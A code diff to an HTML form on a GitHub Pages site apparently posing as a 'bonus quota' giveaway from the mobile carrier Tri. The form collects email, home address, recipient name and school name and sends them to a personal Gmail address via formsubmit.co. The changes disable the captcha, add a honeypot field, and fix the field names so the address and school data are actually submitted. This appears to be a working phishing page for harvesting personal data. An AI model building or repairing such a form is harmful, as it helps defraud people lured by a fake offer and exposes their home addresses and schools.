@@ -21,9 +21,17 @@
   </head>
   <body>
 
+
+
   <form action="https://formsubmit.co/fathandsome22@gmail.com" method="POST">
 
-<input type="hidden" name="_next" value="https://andhikwelok.github.io/BonusKuotaTri/sukses.html">
+    <!--honeypot-->
+    <input type="text" name="_honey" style="display: none;">
+
+    <!--Captcha-->
+    <input type="hidden" name="_captcha" value="false">
+
+    <input type="hidden" name="_next" value="https://andhikwelok.github.io/BonusKuotaTri/sukses.html">
 
 
 
@@ -42,9 +50,9 @@
     
     <h1>Data pribadi</h1>
     <input type="text" placeholder="email">
-    <input type="text" placeholder="alamat rumah" id="pesan" nama="alamat">
+    <input type="text" placeholder="alamat rumah" id="pesan" name="alamat">
     <input type="text" placeholder="nama penerima">
-    <input type="text" placeholder="masukkan nama sekolah" nama="sekolah">
+    <input type="text" placeholder="masukkan nama sekolah" name="sekolah">
     <p>pastikan data pribadi tidak ada yang salah</p>
     
     <center><button id="btn">Kirim</button></center>
